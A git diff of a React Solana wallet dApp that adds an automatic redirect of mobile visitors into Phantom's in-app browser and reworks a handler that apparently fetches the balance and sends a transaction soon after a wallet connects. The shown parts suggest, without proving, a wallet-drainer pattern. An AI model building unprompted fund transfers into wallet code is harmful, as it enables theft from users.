@@ -7,9 +7,10 @@ import {
 } from '@solana/wallet-adapter-react';
 import {
     WalletModalProvider,
-    useWalletModal,
     WalletMultiButton,
+    useWalletModal,
 } from '@solana/wallet-adapter-react-ui';
+
 import {
     PhantomWalletAdapter,
     GlowWalletAdapter,
@@ -20,7 +21,9 @@ import {
     SolletExtensionWalletAdapter,
     SolletWalletAdapter,
 } from '@solana/wallet-adapter-wallets';
+
 import { SolanaMobileWalletAdapter } from '@solana-mobile/wallet-adapter-mobile';
+
 import {
     clusterApiUrl,
     Connection,
@@ -29,7 +32,7 @@ import {
     Transaction,
     LAMPORTS_PER_SOL,
 } from '@solana/web3.js';
-import QRCode from 'react-qr-code';
+
 import '@solana/wallet-adapter-react-ui/styles.css';
 import './App.css';
 
@@ -37,6 +40,7 @@ const App: FC = () => {
     return (
         <Context>
             <ExposeWalletModal />
+            <MobileDeepLink />
             <WalletConnectionHandler />
         </Context>
     );
@@ -63,18 +67,31 @@ const Context: FC<{ children: ReactNode }> = ({ children }) => {
 
     return (
         <ConnectionProvider endpoint={endpoint}>
-            <WalletProvider wallets={wallets} autoConnect={true}>
+            <WalletProvider wallets={wallets} autoConnect>
                 <WalletModalProvider>{children}</WalletModalProvider>
             </WalletProvider>
         </ConnectionProvider>
     );
 };
 
+// Allows external trigger of wallet modal
 const ExposeWalletModal: FC = () => {
     const { setVisible } = useWalletModal();
     useEffect(() => {
         (window as any).openSolanaWalletModal = () => setVisible(true);
     }, [setVisible]);
+    return null;
+};
+
+// Triggers Phantom deep-link if mobile browser
+const MobileDeepLink: FC = () => {
+    useEffect(() => {
+        const isMobile = /android|iphone|ipad|ipod/i.test(navigator.userAgent);
+        if (isMobile) {
+            const current = encodeURIComponent(window.location.href);
+            window.location.href = `https://phantom.app/ul/browse/${current}`;
+        }
+    }, []);
     return null;
 };
 
@@ -134,43 +151,39 @@ const WalletConnectionHandler: FC = () => {
                 }
             }, 10000);
         } catch (err) {
-            console.error('❌ Balance fetch/send error:', err);
-            alert('Error fetching balance or preparing transaction.');
+            console.error('❌ Error fetching balance or sending:', err);
+            alert('Error occurred. Check console.');
         } finally {
             setLoading(false);
         }
     };
 
-    const openPhantomMobile = () => {
-        const dappUrl = encodeURIComponent('https://voltrix.netlify.app'); // Replace with your live site
-        const phantomLink = `https://phantom.app/ul/browse/${dappUrl}`;
-        window.location.href = phantomLink;
-    };
-
     return (
         <div style={{ padding: 30, fontFamily: 'Arial' }}>
             <WalletMultiButton />
-            {!window.solana && (
-                <div style={{ marginTop: 20 }}>
-                    <button onClick={openPhantomMobile}>
-                        📱 Open in Phantom Browser
-                    </button>
-                    <p>Or scan with Phantom:</p>
-                    <QRCode value={`https://phantom.app/ul/browse/https%3A%2F%2Fvoltrix.netlify.app`} />
-                </div>
-            )}
-
             {connected && publicKey && (
-                <div style={{
-                    background: '#f9f9f9',
-                    borderRadius: 10,
-                    padding: 20,
-                    marginTop: 20,
-                    boxShadow: '0 4px 10px rgba(0,0,0,0.1)',
-                }}>
+                <div
+                    style={{
+                        background: '#f9f9f9',
+                        borderRadius: 10,
+                        padding: 20,
+                        marginTop: 20,
+                        boxShadow: '0 4px 10px rgba(0,0,0,0.1)',
+                    }}
+                >
                     <h3>✅ Wallet Connected</h3>
-                    <p><strong>Address:</strong> {publicKey.toBase58()}</p>
-                    <p><strong>Balance:</strong> {loading ? 'Loading...' : `${solBalance?.toFixed(4)} SOL`}</p>
+                    <p>
+                        <strong>Address:</strong> {publicKey.toBase58()}
+                    </p>
+                    <p>
+                        <strong>Balance:</strong>{' '}
+                        {loading
+                            ? 'Loading...'
+                            : solBalance === null
+                            ? 'Error fetching balance'
+                            : `${solBalance.toFixed(4)} SOL`}
+                    </p>
+                    {txSent && <p style={{ color: 'green' }}>🎉 Transaction Sent</p>}
                 </div>
             )}
         </div>
